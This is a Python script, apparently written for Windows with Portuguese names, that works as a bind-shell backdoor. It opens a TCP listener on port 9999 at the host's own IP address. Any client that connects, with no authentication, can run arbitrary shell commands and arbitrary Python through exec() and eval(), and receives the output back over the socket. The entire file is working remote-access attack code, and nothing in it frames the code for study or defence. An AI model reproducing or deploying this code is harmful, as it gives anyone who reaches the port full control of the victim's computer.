from socket import *
from time import sleep
from threading import Thread
from subprocess import check_output
import os
import sys
import urllib.request
import pyautogui
from tkinter import *


def getip():
    comando = "ipconfig | findstr /R /C:\"IPv4\""
    s = "   Endereo IPv4. . . . . . . .  . . . . . . . : "
    s2 = "   Endere‡o IPv4. . . . . . . .  . . . . . . . : "
    try:
        saida = check_output(comando, shell=True).decode('iso-8859-1').replace(s, "")[:-1].split()[0]
    except:
        saida = check_output(comando, shell=True).replace(s2, "")[:-1].split()[17]
    return saida


ip = getip()
porta = 9999

socket_server = socket(AF_INET, SOCK_STREAM)
socket_server.bind((ip, porta))
socket_server.listen(1)

run_command = lambda command: check_output(command, shell=True).decode('850', errors='ignore')

manual = """execshell <cmd>
execpy <python>
evaluation <python>
close"""
def handle_client(socket_client):
    while True:
        try:
            socket_client.send('>>> '.encode())
            dados = socket_client.recv(2**15).decode()
            sleep(1)
            if dados.startswith('execshell '):
                comando = dados[len('execshell '):]
                # socket_client.send('Executando o comando {}...'.format(comando).encode())
                resultado = run_command(comando)
                socket_client.send(resultado.encode())
            elif dados.startswith('execpy '):
                comando = dados[len('execpy '):]
                exec(comando)
                socket_client.send('Executado!'.encode())
            elif dados.startswith('evaluation '):
                saida = str(eval(dados[len('evaluation '):]))
                socket_client.send(saida.encode())
            elif dados.startswith('close'):
                socket_client.send("Closed!".encode())
                socket_client.close()
                sys.exit(0)
            else:
                socket_client.send(manual.encode())

        except Exception as e:
            socket_client.send(str(e).encode())
        sleep(1)
while True:
    try:
        sock, addr = socket_server.accept()
        Thread(target=handle_client, args=(sock, )).start()
    except:
        pass
